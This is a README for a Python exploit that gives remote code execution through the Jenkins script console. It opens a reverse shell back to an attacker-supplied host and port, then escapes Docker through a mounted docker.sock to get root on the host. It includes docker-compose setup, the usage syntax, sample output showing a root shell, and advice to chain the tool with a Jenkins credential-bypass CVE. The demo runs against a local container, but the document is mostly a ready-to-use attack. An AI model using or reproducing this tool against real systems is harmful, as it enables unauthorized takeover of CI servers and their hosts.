# Jenkins

This exploit gives a remote shell on a Jenkins server that is running in a docker container
then it privilege escsalate to root and escape the docker container to provide full root access on the pipeline server.

The inspiration for this code come from the geek lunch session where the PE team migrate to Jenkins and also run docker within docker
in the presentation that makes docker escape and privilege escalation trivial.

## Description

This works because Jenkins script console allow execution of groovy code, so this is not a vuln but a feature that can be exploitet.
Escape docker and get root works because docker.sock is mapped into the container and access to docker.sock is equalent to root access
this is also not a vuln just common sence you not do this from security perspective if you are concern about docker escape and privilege escalation to root.

## Usage

Start docker container with Jenins if you want to test this locally

```ssh
⬢  jenkins_preauth_rce  master ⦿ docker-compose up -d
Creating network "jenkinspreauthrce_default" with the default driver
Creating jenkinspreauthrce_jenkins_1 ... done
```

Verify that container is running.

```ssh
⬢  jenkins_preauth_rce  master ⦿ docker ps
CONTAINER ID        IMAGE                  COMMAND                  CREATED             STATUS              PORTS                                              NAMES
cdd5256e8065        vulhub/jenkins:2.138   "/sbin/tini -- /usr/…"   29 seconds ago      Up 27 seconds       0.0.0.0:8080->8080/tcp, 0.0.0.0:50000->50000/tcp   jenkinspreauthrce_jenkins_1
```

```

Once the Jenkins container is running we can run the exploitation, here is the usage menu.

```ssh
./jenkins_sconsole_rce.py

 ▐▄▄▄▄▄▄ . ▐ ▄ ▄ •▄ ▪   ▐ ▄ .▄▄ ·  ▄▄·        ▐ ▄ .▄▄ ·       ▄▄▌  ▄▄▄ .▄▄▄   ▄▄· ▄▄▄ .
  ·██▀▄.▀·•█▌▐██▌▄▌▪██ •█▌▐█▐█ ▀. ▐█ ▌▪▪     •█▌▐█▐█ ▀. ▪     ██•  ▀▄.▀·▀▄ █·▐█ ▌▪▀▄.▀·
▪▄ ██▐▀▀▪▄▐█▐▐▌▐▀▀▄·▐█·▐█▐▐▌▄▀▀▀█▄██ ▄▄ ▄█▀▄ ▐█▐▐▌▄▀▀▀█▄ ▄█▀▄ ██▪  ▐▀▀▪▄▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐▌▐█▌▐█▄▄▌██▐█▌▐█.█▌▐█▌██▐█▌▐█▄▪▐█▐███▌▐█▌.▐▌██▐█▌▐█▄▪▐█▐█▌.▐▌▐█▌▐▌▐█▄▄▌▐█•█▌▐███▌▐█▄▄▌
 ▀▀▀• ▀▀▀ ▀▀ █▪·▀  ▀▀▀▀▀▀ █▪ ▀▀▀▀ ·▀▀▀  ▀█▄▀▪▀▀ █▪ ▀▀▀▀  ▀█▄▀▪.▀▀▀  ▀▀▀ .▀  ▀·▀▀▀  ▀▀▀
[mikael.kall@kindredgroup.com]

Usage: ./jenkins_sconsole_rce.py <URL> <LHOST> <LPORT> <USERNAME> <PASSWORD>

EXAMPLE: ./jenkins_sconsole_rce.py 'http://127.0.0.1:8080' 10.100.12.xx 1337 <USERNAME> <PASSWORD>

```

Exploit do a reverse_tcp connection so you need to specify your ip and port to your computer for exploit to connect back to
your listener.

```ssh
jenkins  ./jenkins_sconsole_rce.py 'http://127.0.0.1:8080' 10.100.12.41 1337 admin admin
[+] LHOST = 10.100.12.41
[+] LPORT = 1337
[+] Shell listen
[+] HTTP Listen = 8000
172.17.0.2 - - [15/Jun/2018 09:37:21] "GET /5 HTTP/1.1" 200 -
sh-4.4# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4,6,10,11(ftp),20,26(proc),27
```

You now have remote shell on the Jenkins instance and escaped the docker container and got root access on the target machine.

Note that username and password is not required on this demo password authentication is disabled on the container but if you run
on another instance then it may be required or need to be chained with the credentials bypass CVE in Jenkins that you can find upstream.